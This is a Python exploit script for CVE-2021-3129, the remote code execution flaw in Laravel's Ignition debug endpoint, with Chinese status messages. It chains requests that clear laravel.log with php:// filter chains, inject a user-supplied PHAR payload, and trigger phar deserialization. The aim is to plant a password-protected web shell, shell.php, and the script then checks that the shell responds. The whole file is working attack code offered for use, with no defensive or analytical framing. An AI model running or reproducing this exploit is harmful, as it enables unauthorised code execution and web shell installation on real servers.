# !/usr/bin python3                                 
# encoding    : utf-8 -*-                            

import json
import re
import sys
import requests


def toPhar():
    payload = json.dumps({
  "solution": "Facade\Ignition\Solutions\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "phar:///var/www/storage/logs/laravel.log/test.txt"
  }
})

    print(f"正在进行Phar反序列化, 请稍候...")
    req = requests.post(url=url, data=payload, headers=headers)
    if req.status_code == 500:
        shell_url = re.findall("(http[s]{0,1}:\/\/.*?\/)",url)[0]+"shell.php"
        reqShell = requests.post(url=shell_url, data={"erikten":"phpinfo();"})
        if reqShell.status_code == 200 and "phpinfo()" in reqShell.text:
            print(f"\nshell请求成功!\nurl: {shell_url}\n密码: erikten")
            exit()
        else:
            print(f"请求shell失败! 请重新运行程序...\n请求失败Url: {shell_url}")
            exit()
    else:
        print("添加失败! 请重新运行程序...\n")
        exit()

def clearStr():
    payload = json.dumps({
  "solution": "Facade\Ignition\Solutions\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
  }
})

    print(f"正在清空POC中的干扰字符, 请稍候...")
    req = requests.post(url=url, data=payload, headers=headers)
    if req.status_code == 200:
        print("完成 !\n")
        toPhar()
    else:
        print("添加失败! 请重新运行程序...\n")
        exit()


def postPOC():
    try:
        with open(file) as f:
            poc = f.read()
    except FileNotFoundError:
        print(f"未找到{file}! 请检查后重新运行...")
        exit()
    payload = json.dumps({
  "solution": "Facade\Ignition\Solutions\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": f"{poc}"
  }
})

    print(f"正在发送POC, 请稍候...")
    req = requests.post(url=url, data=payload, headers=headers)
    if req.status_code == 500:
        print("完成 !\n")
        clearStr()
    else:
        print("添加失败! 请重新运行程序...\n")
        exit()

def addPrefix():
    payload = json.dumps({
  "solution": "Facade\Ignition\Solutions\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "AA"
  }
})

    print(f"正在添加log前缀, 请稍候...")
    req = requests.post(url=url, data=payload, headers=headers)
    if req.status_code == 500:
        print("完成 !\n")
        postPOC()
    else:
        print("添加失败! 请重新运行程序...\n")
        exit()

def clearLog():
    global count
    payload =json.dumps({
  "solution": "Facade\Ignition\Solutions\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
  }
})

    print(f"正在清空laravel.log, 请稍候...")
    req = requests.post(url=url, data=payload, headers=headers)
    if req .status_code == 200 and count < 3:
        print("完成 !\n")
        count = 0
        addPrefix()
    else:
        print("清空失败! 正在重试...\n")
        count += 1
        clearLog()


if __name__ == "__main__":
    print('''\n                                                                               
,--.                                          ,--.      ,------.               
|  |    ,--,--.,--.--. ,--,--.,--.  ,--.,---. |  |      |  .--. ' ,---. ,---.  
|  |   ' ,-.  ||  .--'' ,-.  | \  `'  /| .-. :|  |      |  '--'.'| .--'| .-. : 
|  '--.\ '-'  ||  |   \ '-'  |  \    / \   --.|  |,----.|  |\  \ \ `--.\   --. 
`-----' `--`--'`--'    `--`--'   `--'   `----'`--''----'`--' '--' `---' `----' 
                                                                               
                                                                               For CVE-2021-3129\n\n''')
    headers = {"Content-Type": "application/json"}
    try:
        url = sys.argv[1]
        file = sys.argv[2]
    except IndexError:
        print("usage: python3 test.py http://192.168.124.37:81/_ignition/execute-solution ./shell.txt")
        exit()
    url = re.findall("(http[s]{0,1}:\/\/.*)",url)[0]
    count = 0
    clearLog()
